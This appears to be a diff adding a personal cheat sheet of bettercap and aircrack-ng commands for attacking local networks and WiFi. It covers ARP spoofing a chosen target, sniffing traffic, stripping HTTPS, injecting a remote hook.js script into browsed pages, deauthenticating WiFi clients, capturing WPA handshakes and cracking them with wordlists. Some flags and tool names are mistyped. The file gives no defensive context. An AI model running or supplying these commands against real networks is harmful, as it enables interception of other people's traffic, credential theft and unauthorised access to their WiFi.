@@ -1,0 +1,115 @@
+bettercap
+route -n
+
+apt-get install bettercap    
+gem install bettercap
+ bettercap  -iface wlan0
+bettercap --help
+bettercap wifi.recon on
+ bettercap -X –no-spoofing
+ bettercap -XL –no-spoofing
+ bettercap -X
+ bettercap -XP HTTPS
+ bettercap –log LOG_FILE
+ bettercap –log LOG_FILE –silent
+ bettercap –proxy-module –js-url http://192.168.10.25:3100/hook.js
+bettercap -t 192.168.88.1 -x
+bettercap v2.26.1
+sudo bettercap
+-----------------------
+[10.3.104.1] [endpoint.new] endpoint 192.168.88.1 detected as e4:8d:8c:25:35:d1
+
+net.show
+net.probe on                  iwconfig
+net.show
+
+set arp.spoof.targets 10.3.104.1
+ arp.spoof on
+set net.sniff.verbose true
+net.sniff on
+
+
+set https.proxy.sslstrip true
+set http:proxy.sslstrip true
+set arp.spoof.internal true
+set arp.spoof.targets 10.3.104.1
+set net.sniff.verbose false
+net.sniff on
+http.proxy on
+arp.spoof on
+
+
+
+
+--------------------------
+        (wifi)
+ bettercap  --iface wlan0
+ wifi.recon on
+events.ignore wifi.ap.new
+wifi.show
+ set net.sniff.output handshaked.pcap
+net.sniff
+events.ignore net.sniff.802.11
+wifi.show 
+wifi.recon.channel 8
+wifi.show
+wifi.deauth
+events.ignore wifi.client.probe
+wifi.show
+aircrack-ng handshaked.pcap
+ aircrack-ng handshaked.pcap -w /usr/share/wordlists/fasttrack.txt
+ aircrack-ng handshaked.pcap -w /usr/share/wordlists/metasploit/routers_userpass.txt
+
+quit
+
+
+---------------------------------
+ ( thes will tell us the device on the network )
+
+net.recon on
+
+
+
+
+-----------------------------
+
+
+Attack specific targets:
+
+sudo bettercap -T 192.168.1.10,192.168.1.11
+
+Attack a specific target by its MAC address:
+
+sudo bettercap -T 01:23:45:67:89:10
+
+Attack a range of IP addresses:
+
+sudo bettercap -T 192.168.1.1-30
+
+Attack a specific subnet:
+
+sudo bettercap -T 192.168.1.1/24
+
+Randomize the interface MAC address during the attack:
+
+
+
+
+
+
+
+
+
+
+
+
+
+----------------
+git clone https://github.com/evilsocket/bettercap
+cd bettercap
+bundle install
+gem build bettercap.gemspec
+sudo gem install bettercap*.gem
+-------------------------------------
+aireblay-ng wlan0 --test
+sudo apt remove bettercap
